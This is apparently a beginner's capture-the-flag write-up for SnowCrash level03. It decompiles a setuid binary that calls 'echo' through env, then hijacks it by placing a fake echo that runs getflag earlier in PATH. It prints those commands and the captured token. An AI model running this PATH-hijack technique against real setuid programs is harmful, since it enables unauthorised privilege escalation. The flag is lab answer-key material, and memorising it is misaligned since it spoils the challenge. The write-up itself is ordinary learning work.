@@ -1,0 +1,46 @@
+With an Ls i saw that there is a program named "level03".
+I cat it to get informations, but it's in binnaries.
+i try to open it with : 'objdump -d level03' and i got a assembly program that
+i dont really understand..
+I found on internet Ghidra, a program who will help me to underatand how the program work.
+It translate the assembly code in C and i found this main on the program : 
+
+/*******************************************************\
+
+int main(int argc,char **argv,char **envp)
+
+{
+  __gid_t __rgid;
+  __uid_t __ruid;
+  int iVar1;
+  gid_t gid;
+  uid_t uid;
+  
+  __rgid = getegid();
+  __ruid = geteuid();
+  setresgid(__rgid,__rgid,__rgid);
+  setresuid(__ruid,__ruid,__ruid);
+  iVar1 = system("/usr/bin/env echo Exploit me");
+  return iVar1;
+}
+
+\*******************************************************/
+
+This line seems important to me :   iVar1 = system("/usr/bin/env echo Exploit me");
+That mean that the program call echo, and that make me think about my old Minishell were the built-in were
+call with the 'PATH=' env. 
+I can maybe use this to make the program call getflag instead of echo !
+
+So i created a little program : echo "/bin/sh -c 'getflag'" > /test/echo
+Then i exported the new PATH env : export PATH=/test:$PATH
+
+I launched Level03 again and this worked ! 
+
+/*********************************************************\
+
+level03@SnowCrash:~$ ./level03 
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+\*********************************************************/
+
+
